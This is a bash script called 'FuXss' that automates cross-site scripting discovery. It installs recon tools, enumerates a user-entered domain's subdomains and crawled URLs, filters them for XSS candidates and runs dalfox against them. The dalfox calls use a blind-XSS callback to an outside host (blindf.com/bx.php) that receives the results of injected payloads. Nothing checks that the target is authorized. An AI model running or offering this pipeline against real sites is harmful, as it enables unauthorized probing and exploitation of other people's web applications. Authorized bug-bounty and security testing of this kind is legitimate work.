#!/bin/bash

# Display the script name in ASCII art
echo "~::FuXss::~"

# Function to check if a command exists
function command_exists {
    command -v "$1" >/dev/null 2>&1
}

# Function to install a tool if not present
function install_tool {
    local tool_name=$1
    local install_cmd=$2
    if ! command_exists $tool_name; then
        echo -e "\033[1;34mInstalling $tool_name...\033[0m"
        eval $install_cmd
        if [ $? -ne 0 ]; then
            echo -e "\033[1;31mFailed to install $tool_name. Please check your installation and path.\033[0m"
            exit 1
        fi
        echo -e "\033[1;32m$tool_name installed successfully.\033[0m"
    fi
}

# Function to generate a file if it doesn't exist
function generate_file {
    local output_file=$1
    local command=$2
    if [ ! -f "$output_file" ] || [ "$rerun_steps" = true ]; then
        echo -e "\033[1;33mGenerating $output_file...\033[0m"
        eval "$command"
        rerun_steps=true
    fi
}

# Logging setup
exec > >(tee -i script.log)
exec 2>&1

# Tool installation
install_tool "waybackurls" "go install github.com/tomnomnom/waybackurls@latest"
install_tool "gau" "go install github.com/lc/gau/v2/cmd/gau@latest"
install_tool "anew" "go install github.com/tomnomnom/anew@latest"
install_tool "subfinder" "go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
install_tool "httpx" "go install github.com/projectdiscovery/httpx/cmd/httpx@latest"
install_tool "gospider" "go install github.com/jaeles-project/gospider@latest"
install_tool "hakrawler" "go install github.com/hakluke/hakrawler@latest"
install_tool "katana" "go install github.com/projectdiscovery/katana/cmd/katana@latest"
install_tool "dalfox" "go install github.com/hahwul/dalfox/v2@latest"
install_tool "uro" "pip3 install uro"
install_tool "gf" "go install github.com/tomnomnom/gf@latest && cp -r $GOPATH/src/github.com/tomnomnom/gf/examples ~/.gf"

# Accept the domain name from the user
echo -e "\033[1;34mEnter the domain name:\033[0m"
read domain

# Ask if user wants to provide a custom payload list for dalfox
echo -e "\033[1;34mDo you want to provide a custom payload list for dalfox? (y/n):\033[0m"
read provide_custom_payload
if [ "$provide_custom_payload" == "y" ]; then
    echo -e "\033[1;34mEnter the path to the custom payload list:\033[0m"
    read custom_payload_path
fi

# Create results and domain subfolder
mkdir -p results/$domain

# Flag to indicate if any step needs to be rerun
rerun_steps=false

# Generate necessary files
generate_file "results/$domain/wayback.txt" "echo $domain | waybackurls | anew results/$domain/wayback.txt"
generate_file "results/$domain/gau.txt" "echo $domain | gau | anew results/$domain/gau.txt"
generate_file "results/$domain/subdomains.txt" "subfinder -d $domain -o results/$domain/subdomains.txt"
generate_file "results/$domain/activesubs.txt" "httpx -l results/$domain/subdomains.txt -o results/$domain/activesubs.txt -threads 200 -silent -follow-redirects"
generate_file "results/$domain/gospider.txt" "gospider -S results/$domain/activesubs.txt -c 10 -d 5 -t 20 --blacklist '.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)' --other-source --timeout 10 | grep -e 'code-200' | awk '{print \$5}' | grep '=' | grep $domain | anew results/$domain/gospider.txt"
generate_file "results/$domain/hakrawler.txt" "cat results/$domain/activesubs.txt | hakrawler -d 10 | grep '$domain' | grep '=' | egrep -iv '.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)' | anew results/$domain/hakrawler.txt"
generate_file "results/$domain/katana.txt" "katana -list results/$domain/activesubs.txt -f url -d 10 -o results/$domain/katana.txt"
generate_file "results/$domain/paths.txt" "cat results/$domain/wayback.txt results/$domain/gau.txt results/$domain/katana.txt results/$domain/gospider.txt results/$domain/hakrawler.txt | anew results/$domain/paths.txt"
generate_file "results/$domain/uro1.txt" "cat results/$domain/paths.txt | uro -o results/$domain/uro1.txt"
generate_file "results/$domain/live_uro1.txt" "httpx -l results/$domain/uro1.txt -o results/$domain/live_uro1.txt -threads 200 -silent -follow-redirects"
generate_file "results/$domain/xss_ready.txt" "cat results/$domain/live_uro1.txt | gf xss | tee results/$domain/xss_ready.txt"

# Run dalfox on xss_ready.txt if Vulnerable_XSS.txt is missing
if [ ! -f results/$domain/Vulnerable_XSS.txt ] || [ "$rerun_steps" = true ]; then
    echo -e "\033[1;33mRunning dalfox to generate Vulnerable_XSS.txt...\033[0m"
    if [ "$provide_custom_payload" == "y" ]; then
        dalfox file results/$domain/xss_ready.txt -b https://blindf.com/bx.php --custom-payload $custom_payload_path -o results/$domain/Vulnerable_XSS.txt
    else
        dalfox file results/$domain/xss_ready.txt -b https://blindf.com/bx.php -o results/$domain/Vulnerable_XSS.txt
    fi
fi

echo -e "\033[1;32mData collection complete. Check the 'results/$domain' directory for output files.\033[0m"
